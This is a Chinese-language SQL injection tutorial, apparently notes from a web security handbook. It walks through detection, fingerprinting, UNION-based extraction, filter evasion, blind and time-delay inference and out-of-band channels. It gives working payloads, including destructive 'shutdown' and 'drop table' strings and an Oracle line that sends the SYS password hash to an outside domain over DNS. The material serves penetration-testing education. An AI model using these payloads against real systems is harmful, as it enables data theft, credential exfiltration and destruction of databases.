# 注入SQL

几乎每一个Web应用程序都使用数据库来保存操作所需的各种信息。例如，网上零售商所用的Web应用程序使用数据库保存以下信息：

- 用户账户、证书和个人信息；
- 所销售商品的介绍与价格；
- 订单、账单和支付细节；
- 每名应用程序用户的权限。

数据库中的信息通过SQL（Structured Query Language，结构化查询语言）访问。SQL可用于读取、更新、增加或删除数据库中保存的信息。

SQL是一种解释型语言，Web应用程序经常建立合并用户提交的数据的SQL语句。因此，如果建立语句的方法不安全，那么应用程序可能易于受到SQL注入攻击。这种缺陷是困扰Web应用程序的最臭名昭著的漏洞之一。在最严重的情形中，匿名攻击者可利用SQL注入读取并修改数据库中保存的所有数据，甚至完全控制运行数据库的服务器。

随着Web应用程序安全意识的日渐增强，SQL注入漏洞越来越少，同时也变得更加难以检测与利用。许多主流应用程序采用API来避免SQL注入，如果使用得当，这些API能够有效阻止SQL注入攻击。在这些情况下，通常只有在无法应用这些防御机制时，SQL注入才会发生。有时，查找SQL注入漏洞是一项艰难的任务，需要测试员坚持不懈地在应用程序中探查一两个无法应用常规控制的实例。

有大量广泛的数据库可为Web应用程序提供支持。虽然对绝大多数数据库而言，SQL注入的基本原理大体相似，但它们之间也存在着许多差异，包括语法上的细微变化以及可能影响攻击者所使用的攻击类型的巨大行为与功能差异。3种最常用的数据库，即Oracle、MS-SQL和MySQL。

许多时候，访问和目标应用程序所使用数据库相同的、在本地安装的数据库会有极大帮助。通常，只需修改一个语法或者参考一个内置表或功能就可实现自己的目的。从目标应用程序收到的响应一般并不完整或者含义模糊，需要猜测才能理解。如果能交叉参考相同数据库的一个完全“透明”运行的版本，理解起来就容易得多。

如果这种方法不可行，最好找一个可以进行测试的适当交互式在线环境，如SQLzoo.net中的交互式在线教程。

技巧
- 单引号逃逸后注入 `'`
- 设置总为真的条件 `OR 1=1`
- 注释忽略其余部分 `-- ` 
    - 在MySQL中，需要在双连字符后加入一个空格，或者使用 `#` 符号指定注释。


## 注入不同的语句类型

SQL语言中包含许多可能出现在语句开头的动词。由于SELECT是最常用的动词，因此绝大多数的SQL注入漏洞出现在这种语句中。任何类型的语句都可能存在SQL缺陷

根据使用的应用程序功能对后端 SQL 语句进行猜测

### SELECT语句

SELECT语句被用于从数据库中获取信息。它们常用于应用程序响应用户操作而返回信息的功能中，如浏览一个产品目录、查看一名用户的资料或者进行一项搜索。根据数据库中的数据核对用户提交的信息的登录功能也经常使用这种语句。

SQL注入攻击的进入点（entry point）通常是查询中的WHERE子句，它将用户提交的数据传送给数据库，以控制查询结果的范围。因为WHERE子句一般在SELECT语句的最后，攻击者就可以使用注释符号将查询截短到其输入的结束位置，而不会使整个查询的语法失效。

SQL注入漏洞偶尔也会影响SELECT查询的其他部分，如ORDER BY子句或表和列名称。

### INSERT语句

INSERT语句用于在表中建立一个新的数据行。应用程序通常使用这种语句添加一条新的审计日志、创建一个新用户账户或生成一个新订单。

例如，如果一个应用程序允许用户自我注册，指定他们自己的用户名和密码，就可以使用语句将用户资料插入表中。

如果username或password字段存在SQL注入漏洞，那么攻击者就可以在表中插入任何数据。然而，要想这样做，攻击者就必须确保VALUES子句的其他部分正常运行。特别是其中数据项的个数与类型必须正确。

假如某字段用来决定账户权限，那么攻击者就可以利用它创建一个管理用户。

有时，攻击者完全盲目地注入一个INSERT语句也能够从应用程序中提取出字符串数据。例如，攻击者可以拦截数据库的版本字符串，并把它插入自己用户资料的一个字段中；正常情况下，浏览器将显示数据库的版本信息。

当设法注入一个INSERT语句时，可能无法提前知道需要提交多少个参数或参数的类型。可以通过在子句中持续增加一个新的字段，直到应用程序创建了确实想要的用户账户，从而解决上述问题。

由于大多数数据库都会隐式地将一个整数转换为一个字符串，可以在每个位置都使用一个整数。

确定注入点之后的正确字段数后，在MS-SQL中，测试员可以任意添加另外一个查询。

在Oracle中，则可以在insert查询内发布subselect查询。该subselect查询可能导致主查询成功或失败。

### UPDATE语句

UPDATE语句用于修改表中的一行或几行数据。它们经常用在用户修改已有数据值的功能中，例如，更新联系信息、修改密码或更改订单数量。

典型UPDATE语句的运行机制与INSERT语句类似，只是UPDATE语句中通常包含一个WHERE子句，告诉数据库更新表中哪些行的数据。例如，当用户修改密码时，查询首先核实用户的现有密码是否正确，如果密码无误，就用新的值更新它。如果这项功能存在SQL注入漏洞，那么攻击者就能避开现有密码检查，更新管理员的密码

### DELETE语句

DELETE语句用于删除表中的一行或几行数据，例如用户从他们的购物篮中删除一件商品或从个人资料中删除一个交货地址。

与UPDATE语句一样，DELETE语句通常使用WHERE子句告诉数据库更新表中哪些行的数据，并很可能在这个子句中并入用户提交的数据。

### 查明SQL注入漏洞

在最明显的情形中，只需向应用程序提交一个意外输入，就可以发现并最终确定一个SQL注入漏洞。在其他情况下，这种缺陷可能非常微妙，很难与其他类型的漏洞或不会造成安全威胁的“良性”异常区分开来。但是，可以按顺序采取各种步骤准确查明绝大多数的SQL注入漏洞。

在应用程序解析过程中，应该已经确定了应用程序访问后端数据库的各种情形；现在，应当在所有这些情形中探查SQL注入漏洞。实际上，提交给服务器的任何数据都能够以用户无法察觉的方式传送给数据库函数，并且可能得到不安全的处理。因此，需要检查所有这些数据，以查找SQL注入漏洞。这包括所有URL参数、cookie、POST数据项以及HTTP消息头。无论哪一种情况，相关参数名称与参数值的处理过程都可能存在漏洞。

在探查SQL注入漏洞时，一定要确保完全遍历任何可以提交专门设计的输入的多阶段过程。应用程序通常会从几个请求中收集一组数据，一旦收集到全部的数据，就将其保存在数据库中。这时，如果仅在每个请求中提交专门设计的数据并监控应用程序对那个请求的响应，就会遗漏许多SQL注入漏洞。

#### 注入字符串数据

如果SQL查询合并用户提交的数据，它会将这些数据包含在单引号中。为利用任何SQL注入漏洞，攻击者需要摆脱这些引号的束缚。

渗透测试步骤:

1. 提交一个单引号作为目标查询的数据。观察是否会造成错误，或结果是否与原始结果不同。如果收到详细的错误消息，查询以了解此消息的含义。

2. 如果发现错误或其他异常行为，同时提交两个单引号，看会出现什么情况。数据库使用两个单引号作为转义序列，表示一个原义单引号（literal single quote），因此这个序列被解释成引用字符串中的数据，而不是结束字符串的终止符。如果这个输入导致错误或异常行为消失，则应用程序可能易于受SQL注入攻击。

3. 为进一步核实漏洞是否存在，可以使用SQL连接符建立一个等同于“良性”输入的字符串。如果应用程序以与处理对应“良性”输入相同的方式处理专门设计的输入，那么它很可能易于受到攻击。每种数据库使用的字符连接方法各不相同。

可以通过在特定的参数中提交SQL通配符`%`来确定应用程序是否正与后端数据库交互。例如，在搜索字段中提交这个通配符通常会返回大量结果，表明输入正被传送到SQL查询中。当然，这不一定表示应用程序易受攻击——只是应该深入探查以确定是否存在任何具体的漏洞。

使用单引号查找SQL注入漏洞时，应特别注意浏览器处理返回的页面时发生的任何JavaScript错误。应用程序经常在JavaScript中返回用户提交的输入，原义单引号将导致JavaScript解释器中出现错误。在响应中注入任意JavaScript将导致跨站点脚本攻击。

#### 注入数字数据

如果SQL查询合并用户提交的数字数据，应用程序仍然会将它包含在单引号之中，作为字符串数据进行处理。因此，一定要执行前面描述的针对字符串数据的渗透测试步骤。但是，许多时候，应用程序会将数字数据以数字格式直接传送到数据库中，并不把它放入单引号中。如果前面描述的测试方法无法检测到漏洞，还可以采取以下针对数字数据的特殊测试步骤。

渗透测试步骤:
1. 尝试输入一个结果等于原始数字值的简单数学表达式。例如，如果原始值为2，尝试提交1+1或3–1。如果应用程序做出相同的响应，则表示它易于受到攻击。

2. 如果证实被修改的数据会对应用程序的行为造成明显影响，则前面描述的测试方法最为可靠。例如，如果应用程序使用数字化PageID参数指定应返回什么内容，则用1+1代替2得到相同的结果明显表示存在SQL注入。但是，如果能够在数字化参数中插入任意输入，但应用程序的行为却没有发生改变，那么前面的检测方法就无法发现漏洞。

3. 如果第一个测试方法取得成功，你可以利用更加复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证据。ASCII命令就是一个典型的示例，它返回被提交字符的数字化ASCII代码。例如，因为A的ASCII值为65，在SQL中，`67-ASCII('A')`等于2。

4. 如果单引号被过滤掉，那么前面的测试方法就没有作用。但是，这时可以利用这样一个事实：即在必要时，数据库会隐含地将数字数据转化为字符串数据。例如，因为字符1的 ASCII值为49，在SQL中，`51-ASCII(1)`等于2。

在探查应用程序是否存在SQL注入之类的缺陷时，常常会犯一个错误，即忘记某些字符在HTTP请求中具有特殊含义。如果你希望在攻击有效载荷中插入这些字符，必须谨慎地对它们进行URL编码，确保应用程序按预料的方式解释它们

一般来说，前面描述的步骤足以确定绝大多数的SQL注入漏洞，包括许多向浏览器返回无用结果或错误信息的漏洞。但是，在某些情况下，可能有必要使用更加高级的技巧，如时间延迟，来确定漏洞是否存在。

#### 注入查询结构

如果用户提交的数据被插入SQL查询结构，而不是查询中的数据项中，这时实施SQL注入攻击只需要直接应用有效的SQL语法，而不需要进行任何“转义”。

SQL查询结构中最常见的注入点是ORDER BY子句。ORDER BY关键字接受某个列名称或编号，并根据该列中的值对结果集进行排序。用户经常使用这种功能对浏览器中的表进行排序。

如果ORDER BY中的列名称由用户指定，就没有必要使用单引号，因为用户提交的数据已经直接修改了SQL查询的结构。

在极少数情况下，用户提交的输入可能会指定WHERE子句中的列名称。由于这些输入也没有包含在单引号中，因此会导致与前面介绍的漏洞类似的问题。最终，有大量应用程序允许用户指定排序关键字（ASC或DESC），可能认为这并不会导致SQL注入攻击。

在列名称中查找SQL注入漏洞可能会相当困难。如果提交一个并非有效列名称的值，查询将导致错误。这意味着，无论攻击者提交路径遍历字符串、单引号、双引号或任何其他任意字符串，应用程序都会返回相同的响应。因此，采用常用的自动模糊测试和手动测试技巧往往会遗漏某些漏洞。如果提交用于探查各种漏洞的标准测试字符串全部导致相同的响应，这本身并不表示出现任何错误。

传统的SQL注入防御措施并不能防范用户提交的列名称。使用预处理的语句或转义单引号也不能阻止这类SQL注入。

渗透测试步骤:
1. 记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数。

2. 提供一系列在参数值中提交数字值的请求，从数字1开始，然后逐个请求递增。

- 如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到ORDER BY子句中。在SQL中，ORDER BY 1将依据第一个列进行排序。然后，将这个数字增加到2将更改数据的显示顺序，以依据第二个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，你可以通过使用以下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他SQL：

    - `1 ASC -- `
    - `1 DESC -- `

- 如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中。

在ORDER BY子句中实施SQL注入与其他注入情形有很大区别。此时，数据库不会接受查询中的UNION、WHERE、OR或AND关键字。通常，实施注入攻击需要攻击者指定一个嵌套查询来替代参数，如用条件异常语句 `select 1 where <<condition>> or 1/0=0` 替代列名称进行推断。对于支持批量查询的数据库（如MS-SQL），这可能是最有效的注入攻击方法。

## “指纹”识别数据库

我们已经知道如何提取常见数据库的版本字符串。即使由于某种原因无法提取到版本信息，我们还是可以使用其他方法识别数据库。一种最可靠的方法是根据数据库连接字符串的不同方式进行识别。在控制某个字符串数据项的查询中，可以在一个请求中提交一个特殊的值，然后测试各种连接方法，以生成那个字符串。如果得到相同的结果，就可以确定所使用的数据库类型。下面的示例说明常用的数据库如何构建services字符串。

- Oracle：`'serv'||'ices'`
- MS-SQL：`'serv'+'ices'`
- MySQL：`'serv' 'ices'` 注意中间有空格

如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项在目标数据库中的求值结果为0，在其他数据库中则会导致错误。

- Oracle：`BITAND(1,1)-BITAND(1,1)`
- MS-SQL：`@@PACK_RECEIVED-@@PACK_RECEIVED`
- MySQL：`CONNECTION_ID()-CONNECTION_ID()`

MS-SQL和Sybase数据库起源相同，因此它们在表结构、全局变量和存储过程方面存在许多相似之处。绝大多数针对MS-SQL的攻击技巧同样也适用于Sybase。

在识别数据库时，MySQL如何处理某些行内注释（inline comment）也是一个值得关注的问题。如果一个注释以感叹号开头，接着是数据库版本字符串，那么只要数据库的实际版本等于或高于那个字符串，应用程序就会将注释内容解释为SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。与C中的预处理指令类似，程序员也可以对这一点加以利用，编写出根据所使用的数据库版本进行处理的不同代码。攻击者还可以利用它来识别数据库的实际版本。例如，如果使用的MySQL版本高于或等于3.23.02，注入下面的字符串将使SELECT语句的WHERE子句为假：
- `/*!32302 and 1=0*/`

## UNION 操作符

SQL使用UNION操作符将两个或几个SELECT语句的结果组合到独立一个结果中。如果一个Web应用程序的SELECT语句存在SQL注入漏洞，通常可以使用UNION操作符执行另一次完全独立的查询，并将它的结果与第一次查询的结果组合在一起。如果应用程序向浏览器返回查询结果，那么就可以使用这种技巧从应用程序中提取任意的数据。所有的主流DBMS产品均支持UNION，对于直接返回查询结果的情况，UNION是检索信息最快捷的方式。

如果使用UNION操作符组合两个或几个SELECT查询的结果，那么组合结果的列名称与第一个SELECT查询的列名称完全相同。

UNION操作符可在SQL注入攻击中的两个重要限制。

- 如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同。也就是说，它们的列数必须相同，必须使用按相同顺序出现的相同或兼容的数据类型。

- 为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称。

当列数不一致或类型不兼容时，SQL 查询将产生错误。通常，数据库返回的错误消息将被应用程序截获，并不显示在用户的浏览器上。但是，可以利用以下三点帮助简化这项任务。

- 为使注入的查询能够与第一个查询结合，它不一定要使用完全相同的数据类型。但是，它们必须相互兼容，也就是说，第二个查询中的每种数据类型要么必须与第一个查询中的对应类型完全相同，要么必须隐含地转换到那个类型。数据库会将一个数字值隐含地转换为一个字符串值。实际上，NULL值可被转换成任何数据类型。因此，如果不知道某个特殊字段的数据类型，只需在那个字段输入SELECT NULL即可。

- 如果数据库返回的错误消息被应用程序截获，还是可以轻易确定注入的查询是否得以执行。因此，如果查询已经执行，那么应用程序第一个查询返回的结果后面会增加其他结果。可以据此进行系统的推测，直到查明需要注入的查询结构。

- 许多时候，只需在第一个查询中确定一个使用字符串数据类型的字段就可以达到自己的目的。这足以允许注入任意返回字符串数据的查询并获得其结果，帮助系统性地从数据库中提取任何想要的数据。

### 渗透测试步骤

攻击的首要任务是查明应用程序执行的最初查询所返回的列数。有两种方法可以完成这项任务。

1. 可以利用NULL被转换为任何数据类型这一事实，系统性地注入包含不同列数的查询，直到注入的查询得到执行，例如：

    `' UNION SELECT NULL--`
    `' UNION SELECT NULL, NULL--`
    `' UNION SELECT NULL, NULL, NULL--`

    查询得到执行就说明使用了正确的列数。如果应用程序不返回数据库错误消息，仍然可以了解注入的查询是否成功执行，因为会收到另外一行数据，其中包含NULL或一个空字符串。注意，注入行可能只包含空单元格，因此不容易得知何时以HTML提交。出于这个原因，进行攻击的最好是查看行响应。

2. 确定所需的列数后，下一项任务就是找到一个使用字符串数据类型的列，以便通过它从数据库中提取出任意数据。和前面一样，可以通过注入一个包含NULL值的查询，并系统性地用a代替每个NULL，从而完成这项任务。例如，如果知道查询必须返回3列，可以注入以下查询：

    `' UNION SELECT 'a', NULL, NULL--`
    `' UNION SELECT NULL, 'a', NULL--`
    `' UNION SELECT NULL, NULL, 'a'--`

    如果注入的查询得到执行，将看到另一行包含a值的数据，然后就可以使用相关列从数据库中提取数据。

在Oracle数据库中，每个SELECT语句必须包含一个FROM属性，因此，无论列数是否正确，注入`UNION SELECT NULL`将产生一个错误。可以选择使用全局可访问表（globally accessible table）`DUAL` 来满足这一要求。例如：

    `' UNION SELECT NULL FROM DUAL--`

## 提取数据

### 数据库版本字符串

如果已经确定注入的查询所需的列数，并且已经找到一个使用字符串数据类型的列，就能够提取出任意数据。一个简单的概念验证测试是提取数据库的版本字符串，可以对任何数据库管理系统（DBMS）进行测试。

MS-SQL和MySQL
    `' UNION SELECT @@version,NULL,NULL--`
Oracle
    `' UNION SELECT banner,NULL,NULL FROM v$version--`

### 查询数据库表/列的名称

步骤
1. 使用 UNION SELECT NULL 探测列数
2. 使用字符串类型数据遍历列
3. 查询元数据表`information_schema.columns`，其中包含数据库中的所有表和列名称的详细资料
4. 使用得到的表与列名提取数据

MS-SQL、MySQL和许多其他数据库（包括SQLite 和Postgresql）均支持information_schema。它主要用于保存数据库元数据，这也使它成为探查数据库的攻击者的主要目标。需要注意的是，Oracle并不支持该方案。对Oracle数据库实施攻击时，攻击方法在其他各方面可能完全相同。但是，需要使用查询`SELECT table_name,column_name FROM all_tab_columns`来检索有关数据库表和列的信息。（使用user_tab_columns表以仅针对当前数据库。）通常，在分析大型数据库以探查攻击目标时，最好是查找有用的列名称，而不是表。

如果目标表返回了多个列，则可以将这些列串连到单独一个列中，这样检索起来会更加方便，因为这时只需要在原始查询中确定一个varchar字段：

- Oracle：`SELECT table_name||':'||column_name FROM all_tab_columns`

- MS-SQL：`SELECT table_name+':'+column_name from information_schema.columns`

- MySQL：`SELECT CONCAT(table_name,':',column_name) from information_schema.columns`

## 避开过滤

有时，易受SQL 注入攻击的应用程序可能会执行各种输入过滤以防止攻击者无限制地利用其中存在的缺陷。例如，应用程序可能会删除或净化某些字符，或阻止常用的SQL关键字。这种过滤通常非常容易避开，这时可尝试使用各种技巧。

### 避免使用被阻止的字符

如果应用程序删除或编码某些在SQL注入攻击中经常用到的字符，不使用这些字符仍然能够实施攻击。

- 如果要注入数字数据字段或列名称，不一定必须使用单引号。插入字符串可以通过各种字符串函数，使用每个字符的ASCII代码动态构建一个字符串。

    Oracle `CHR(ASCII码)||CHR(ASCII码)`
    MS-SQL `CHAR(ASCII码)+CHAR(ASCII码)`
    
- 如果注释符号被阻止，通常可以设计注入的数据，使其不会破坏周围查询的语法。例如，不用注入
    `' or 1=1--`
    可以注入
    `' or 'a'='a`

- 在MS-SQL数据库中注入批量查询时，不必使用分号分隔符。只要纠正所有批量查询的语法，无论你是否使用分号，查询解析器都会正确解释它们。

### 避免使用简单确认

一些输入确认机制使用一个简单的黑名单，阻止或删除任何出现在这个名单中的数据。在这种情况下，应该尝试使用标准的攻击方法，寻找确认和规范化机制中的常见缺陷。例如，如果SELECT关键字被阻止或删除，可以尝试
- 大小写
- 空字符 `%00` 
- 冗余删除拼接 `SELSELECTECT`
- URL 与 UNICODE 编码

### 使用 SQL 注释

与C++一样，我们也可以在SQL语句中插入行内注释，注释内容包含在`/*`与`*/`符号之间。如果应用程序阻止或删除输入中的空格，可以使用注释 `/**/` “冒充”注入数据中的空白符。
    `SELECT/*foo*/`

在MySQL中，注释甚至可以插入关键字中，这种方法可避开某些输入确认过滤，同时保留查询中的语法。
    `SEL/*foo*/ECT`

### 利用有缺陷的过滤

输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序在对多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面的缺陷。

## 二阶SQL注入

一种特别有益的避开过滤的方法与二阶SQL注入（second-order SQL injection）有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一旦数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不像面向因特网的主要应用程序一样安全，但却拥有较高权限的数据库账户。

在一些应用程序中，用户输入在到达时通过转义单引号来进行确认: 用户提交的单引号被转换为两个单引号，因而传送给数据库的搜索项与用户最初输入的表达式具有相同的字符含义。

与单引号配对方法有关的问题出现在更复杂的情形中，此时同一个数据项被提交给几个SQL查询，然后写入数据库被几次读取（不同组件，不同位置）。这是证明简单输入确认相对于边界确认存在不足的一个示例。

假设开发者将使用双重单引号以转义单个单引号，它不会在数据库中造成问题。然而，假设应用程序的其他功能从数据库中使用此数据，此时单引号在未被转义的语句中实现注入（数据存入时转义，取出作为另一个SQL查询时未转义。即，功能a传递载荷，功能b触发载荷）

## 高级利用

到现在为止，我们描述的所有攻击中，有一些现成的方法可帮助从数据库中提取有用的数据，例如，通过执行UNION攻击或在错误消息中返回数据。随着人们防御SQL注入威胁意识的增强，即使遇到SQL注入漏洞，攻击者仍然无法直接获取注入的查询的结果。

并非所有攻击都旨在盗窃敏感数据。一些攻击可能更具破坏性，例如，仅仅提交12个字符的输入，攻击者就能够使用关闭命令（shutdown）关闭一个MS-SQL数据库。
    `' shutdown--`
攻击者还可以注入恶意命令，`drop`命令删除数据库表：
    `' drop table 表名--`

### 获取数字数据

如果包含单引号的输入得到正确处理，那么应用程序中的字符串字段就不易受SQL注入攻击。但是，数字数据字段可能仍然存在漏洞。在这种字段中，用户输入并不包含在单引号中。这时攻击者只有通过应用程序的数值响应（numeric response），才能获得注入查询的结果。

在这种情况下，攻击者需要做的是获取数字形式的有用数据，对注入查询的结果进行处理。使用以下两个关键函数：

- `ASCII`，它返回输入字符的ASCII代码；
- `SUBSTRING`（或Oracle中的SUBSTR），它返回输入的子字符串。

这些函数结合在一起使用，以数字形式从一个字符串中提取单独一个字符。例如：

- `SUBSTRING('Admin',1,1)`返回A
- `ASCII('A')`返回65

因此

- `ASCII(SUBSTR('Admin',1,1))`返回65

使用这两个函数，可以系统地将一个有用数据的字符串分割成单个的字符，并以数字形式分别返回每一个字符。在自定义攻击中，可以利用这种技巧，以一次一个字节的速度，迅速获得并重建大量基于字符串的数据。

在处理字符串操作和数字计算方面，不同数据库平台之间存在大量细微的区别，当实施这种高级攻击时，查找不同数据库之间这些区别的详细指南
    https://sqlzoo.net/wiki/Functions_Reference

另一种表现形式，即应用程序返回的并不是真正的数字，而是一些以该数字为标识符的资源。应用程序根据用户的输入执行一个SQL查询，获得一个文档的数字标识符，然后将文档的内容返回给用户。在这种情况下，攻击者可以先获得标识符在相关数字范围内的每一份文档的备份，然后在文档内容与标识符之间建立映射。接下来，当实施前面描述的攻击时，攻击者就可以参考这个映射确定应用程序返回的每个文档的标识符，因而得到他们成功提取的字符的ASCII值。

### 使用带外通道

在许多SQL注入攻击中，应用程序并不在用户的浏览器中显示注入查询的结果，也不返回数据库生成的任何错误消息。即使出现这种情况，仍然可以使用各种技巧获取数据、确认其他恶意操作是否取得成功。

在这种情况下，一种获取数据的有效方法是使用带外通道。能够在数据库中执行任意SQL语句后，渗透测试员往往可以利用数据库的一些内置功能在数据库与自己的计算机之间建立网络连接，通过它传送从数据库中收集到的任何数据。

MS-SQL
    一些老式数据库，如MS-SQL2000以及更早的版本，可使用OpenRowSet命令与外部数据库建立连接并在其中插入任何数据。
    可以指定端口80，或者任何其他可能的值，以提高穿透防火墙建立外部连接的可能性。

Oracle
    Oracle 中包含大量低权限用户可访问的默认功能，可以使用它们建立带外连接。

    `UTL_HTTP`包可用于向其他主机提出任意HTTP请求。UTL_HTTP包含丰富的功能，并支持代理服务器、cookie、重定向和验证。这意味着，如果攻击者已经攻破一个受到强大保护的企业内部网络中的数据库，他就能够利用企业代理服务器与因特网建立外部连接。

    `UTL_INADDR`包旨在将主机名解析为IP地址。它可用于在攻击者控制的服务器中生成任意DNS查询。许多时候，相比于UTL_HTTP攻击，这类攻击更可能取得成功，因为即使HTTP流量被阻止，通常DNS流量仍然能够穿透企业防火墙。攻击者能够利用这个包查找数据后，将它作为子域放在他们控制的一个域名前面，查看对子域的 DNS 请求以获得任意数据
        `查询语句||'.攻击者域名'`

    `UTL_SMTP`包可用于发送电子邮件。在出站电子邮件中发送这个包，即可获得大量从数据库中截取的数据。

    UTL_TCP包可用于打开任意TCP套接字，以发送和接收网络数据。

    在Oracle 11g中，ACL为上述许多资源提供保护，以防止任意数据库用户执行恶意操作。只需研究一下Oracle 11g中提供的新功能，就可以轻松避开该ACL，使用以下代码即可实现：

        `SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS')||'.mdsec.net',80)`

MySQL
    `SELECT…INTO OUTFILE`命令可将任意一个查询的输出指向一个文件。指定的文件名可包含网络资源位置的 UNC 路径

    要想接收到文件，必须在计算机上建立 SMB 共享，允许匿名写入访问。可以在基于Windows和UNIX的平台上配置共享，以实现匿名写入。如果无法接收到输出的文件，可能是因为SMB服务器的配置有问题。可以使用一个嗅探器确定目标服务器是否与指定计算机建立了入站连接（inbound connection），如果连接已经建立，参考服务器文档资料确保它得到正确配置。

利用操作系统
    通常可以在数据库服务器的操作系统上执行任意命令，以此实施权限提升攻击。这时，攻击者可以采用许多手段获得数据，如使用tftp、mail和telnet等内置命令，或者将数据复制到Web根目录使用浏览器获取。


### 使用推论：条件式响应

造成带外通道不可用的原因有许多。大多数情况下，是因为数据库处在一个受保护的网络中，它的边界防火墙禁止任何与因特网或其他网络的带外连接。这时，只能通过Web应用程序注入点（injection point）访问数据库。

在这种情况下，攻击或多或少带有盲目性质，但攻击者仍然可以使用各种技巧从数据库中获得任意数据。这些技巧全都基于如下概念：使用一个注入查询有条件地在数据库中触发某种可以探测的行为，然后根据这种行为是否发生推断出所需信息。

如，使用条件的真假控制功能是否执行来推断数据，探测密码时循环每个字符的所有可能的ASCII编码，直到出现一个“触点”，就能够以每次一个字节的速度，提取出整个字符串。

### 引发条件性错误

在前面的示例中，应用程序拥有一些主要功能，可以通过注入一个现有的SQL查询直接控制它们的逻辑。攻击者能够劫持应用程序计划执行的行为（成功或失败的登录）以获得想要的信息。然而，并非所有攻击都这样简单。有时，注入的查询并不会给应用程序的行为（如日志机制）造成直接影响。或者，应用程序并不处理注入的一个子查询或批量查询。

此时，尝试触发可探测的行为差异的核心理念是：注入一个查询，依照某个特定的条件引发一个数据库错误。如果发生数据库错误，可以通过HTTP500响应码，或者通过某种错误消息或反常行为（即使错误消息本身并未揭示任何有用的信息），从外部探测到这个错误。

这种技巧利用了数据库在求条件语句的值时表现出的条件语句短路执行，使用WHERE子句的SELECT语句 

`SELECT X FROM Y WHERE C`

这条语句使数据库访问表Y的每一行，评估条件C。如果条件C为真，返回X。如果条件C永为假，永远不求出表达式X的值。

可以找到一个语法有效但如果求值就会生成错误的表达式X，对这种行为加以利用。在Oracle与MS-SQL中，被零除计算就是这样的表达式，如`1/0`。如果条件C为真，那么求表达式X的值，这造成一个数据库错误。如果条件C为假，就不会发生错误。因此，可以通过是否发生错误测试任意一个条件C。

这种技巧的目的是在应用程序中引发一个条件性响应，即使注入的查询不会给应用程序的逻辑或数据处理造成影响。因此，利用它就可以使用前面描述的推论技巧在各种情况下提取到所需要的数据。而且，由于这种技巧非常简单，相同的攻击字符串可应用于一系列数据库，其中的注入点则位于各种类型的SQL语句中。

这种技巧的用途非常广泛，因为它可以用在可以注入子查询的各种注入点中。例如：

    `SELECT 1 WHERE 条件 OR 1/0=0`

通过对Absinthe或SQLMap之类的SQL注入工具仔细设定这个条件，我们可以检索数据库中的每一条记录。

### 使用时间延迟

设计出一个根据攻击者指定的条件造成时间延迟的查询。攻击者可以提交设计的查询，然后监控服务器做出响应所花的时间。如果发生延迟，攻击者可推断条件为真。即使在两种情况下应用程序的响应完全相同，攻击者仍然可根据是否存在时间延迟从数据库中提取一比特数据。通过大量执行这类查询，攻击者就能够系统性地从数据库中提取任何复杂的数据，每次一比特。

引发适当时间延迟方法的精确性取决于所使用的目标数据库。MS-SQL中包含一个内置`WAITFOR DELAY 时间`命令，可用于引起一个指定的时间延迟。

攻击者可以循环使用每个字符的所有可能值，直到发生时间延迟。另外，可以通过减少所需请求的数量，提高攻击的效率。另一个技巧是将每个字节的数据划分成比特，并在每次查询中获得一比特的数据。`POWER`命令和按位“与”运算符`&`可在逐比特的基础上指定条件：
1. `SUBSTRING` 提取一个字符
2. `ASCII` 转字符为 ASCII 编码
3. `& POWER` ASCII 编码按2的幂与，得到比特

如前所述，这种引发时间延迟方法的准确性在很大程度上取决于所使用的数据库。在当前版本的My-SQL中，睡眠函数`sleep`可创建指定时间的时间延迟

在5.0.12版本之前的MySQL中，不能使用睡眠函数，但可以使用基准函数 `benchmark` 重复执行一个特定的操作。指示数据库执行一个处理器密集型操作，如SHA-1散列，大量的操作次数将造成一次可测量的时间延迟。

在PostgreSQL中可使用`PG_SLEEP`函数，其使用方法与MySQL睡眠函数相同。

在Oracle中，没有产生时间延迟的内置方法，一种方法是使用`UTL_HTTP`连接一个不存在的服务器，造成一次操作超时。这会使数据库尝试与指定的服务器建立连接，并最终造成超时。


如前所述，在Oracle和MySQL数据库中，都可以使用`SUBSTR`和`ASCII`函数每次一字节地获取任意信息。

提示　我们已经说明了如何使用时间延迟来获得有用的信息。然而，当对应用程序进行初步探查、检测SQL注入漏洞时，时间延迟技巧也可能非常有用。在一些完全盲目的SQL注入攻击中，浏览器中不会显示查询结果，所有错误都被应用程序以隐含的方式处理，使用提交专门设计的输入的标准技巧可能很难检测出漏洞。这时，使用时间延迟是在初步探查过程中检测一个漏洞是否存在的最有效方法。例如，如果后端数据库为MS-SQL，那么可以将下面的两个字符串轮流注入每个请求参数中，并监控应用程序响应请求所用的时间，从而确定所有漏洞：

    `'; waitfor delay '0:30:0'--`
    `1; waitfor delay '0:30:0'--`

## SQL注入之外：扩大数据库攻击范围

成功利用一个SQL注入漏洞往往可完全控制应用程序的所有数据。然而，利用数据库中的漏洞，或者控制它的一些内置功能以达到目的，从而进一步实施攻击，可能会取得更大的成效：

- 如果数据库被其他应用程序共享，可以通过提升数据库的使用权限访问其他应用程序的数据。

- 攻破数据库服务器的操作系统。

- 访问其他系统。通常，数据库服务器是一个在几层网络边界防御保护下的网络中的主机。如果能够控制数据库服务器，攻击者就处在一个可信的位置上，可以访问其他主机上的关键服务，进一步对其加以利用。

- 在主机基础架构与自己的计算机之间建立网络连接。这样，攻击者就可以完全避开应用程序的防御，轻易传送从数据库收集到的大量敏感数据，并且可穿透许多入侵检测系统。

